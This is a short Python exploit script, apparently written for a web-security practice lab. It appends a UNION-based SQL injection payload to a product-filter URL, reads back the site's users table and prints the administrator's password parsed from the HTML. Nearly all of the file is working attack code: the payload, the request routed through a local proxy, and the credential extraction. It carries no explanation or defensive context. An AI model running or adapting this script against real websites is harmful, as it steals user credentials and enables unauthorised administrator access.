# Finding username & password table and login using it

import requests
import sys
import urllib3
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies= {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

path = "/filter?category=Gifts"

def exploit_sqli_users_table(url):
    sql_payload = "' UNION select username, password from users--"
    r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
    if "administrator" in r.text:
        print("[+] Found the administrator password.")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
        print(f"[+] The administrator password is: {admin_password}.")
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f"[*] Usage: {sys.argv[0]} <url>")
        print(f"[*] Example: {sys.argv[0]} www.example")
        sys.exit(-1)

    print("[+] Dumping all the username and passwords......")

    if not exploit_sqli_users_table(url):
        print("[-] Did not find an administrator password.")